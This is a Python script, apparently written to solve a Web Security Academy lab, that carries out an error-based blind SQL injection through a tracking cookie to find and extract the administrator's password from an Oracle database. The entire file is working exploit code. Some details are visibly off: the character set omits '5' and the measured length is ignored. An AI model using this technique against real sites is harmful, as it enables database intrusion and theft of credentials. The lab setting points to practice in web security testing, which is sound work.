import requests

url = "https://0ac1003104760f5880cd08d7009600a3.web-security-academy.net/filter?category=Gifts"
characters = "qwertyuiopasdfghjklzxcvbnm123467890"

def get_length():
    
    for i in range(1,101):
        cookie = {"TrackingId":"VrK9VtPlzhd73L0z","session":"BBSSAj83jNritUDHJUgBgmeXqDUVMEzq"}
        payload = f"'||(SELECT CASE WHEN (LENGTH((select password from users where username ='administrator')) = {i}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'"
        cookie['TrackingId'] = cookie['TrackingId']+payload
        res = requests.get(url,cookies=cookie)

        if res.status_code == 500:
            return i
        
def get_data(length):
    temp=""
    for i in range(1,21):
        for char in characters:
            cookie = {"TrackingId":"VrK9VtPlzhd73L0z","session":"BBSSAj83jNritUDHJUgBgmeXqDUVMEzq"}
            payload = f"'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            cookie['TrackingId'] = cookie['TrackingId']+payload
            res = requests.get(url,cookies=cookie)

            if res.status_code == 500:
                print(temp,end=" ")
                temp+=char
                break
    return temp

        
length = get_length()
print(f"password length {length}")
print("Dumping data...")

data = get_data(length)
print(f"got it: {data}")
